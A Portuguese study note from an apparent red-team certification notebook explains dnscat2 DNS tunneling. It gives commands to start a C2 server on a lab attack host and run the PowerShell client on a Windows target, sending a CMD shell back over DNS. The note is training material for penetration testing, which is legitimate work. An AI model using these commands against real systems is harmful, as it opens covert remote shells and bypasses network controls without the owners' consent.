> For the complete documentation index, see [llms.txt](https://savitar.gitbook.io/mynotes/llms.txt). Markdown versions of documentation pages are available by appending `.md` to page URLs; this page is available as [Markdown](https://savitar.gitbook.io/mynotes/certifications-and-notes/red-team/cpts/pivoting-tunneling-and-port-forwarding/dnscat2.md).

# Dnscat2

[Dnscat2](https://github.com/iagox86/dnscat2) é uma ferramenta de tunelamento que usa o protocolo DNS para enviar dados entre dois hosts. Ele usa um canal criptografado `Command-&-Control`( `C&C`ou `C2`) e envia dados dentro de registros TXT dentro do protocolo DNS.

* **Clonando dnscat2 e configurando o servidor**

```sh
git clone https://github.com/iagox86/dnscat2.git
```

* **Iniciando o servidor dnscat2**

```sh
sudo ruby dnscat2.rb --dns host=10.10.14.18,port=53,domain=inlanefreight.local --no-cache
```

* Após executar o servidor, ele nos fornecerá a chave secreta, que teremos que fornecer ao nosso cliente dnscat2 no host do Windows para que ele possa autenticar e criptografar os dados que são enviados ao nosso servidor dnscat2 externo.
* **Clonando dnscat2-powershell para o Host de Ataque**

```sh
git clone https://github.com/lukebaggett/dnscat2-powershell.git
```

* Quando o `dnscat2.ps1`arquivo estiver no destino, podemos importá-lo e executar os cmd-lets associados.

```sh
Import-Module .\dnscat2.ps1
```

* Depois que dnscat2.ps1 for importado, podemos usá-lo para estabelecer um túnel com o servidor em execução em nosso host de ataque. Podemos enviar de volta uma sessão de shell CMD para nosso servidor.

```sh
Start-Dnscat2 -DNSserver 10.10.14.18 -Domain inlanefreight.local -PreSharedSecret 0ec04a91cd1e963f8c03ca499d589d21 -Exec cmd 
```

* Podemos listar as opções que temos com dnscat2 digitando `?`no prompt.
* **Interagindo com a Sessão Estabelecida**

```
dnscat2> window -i 1
```
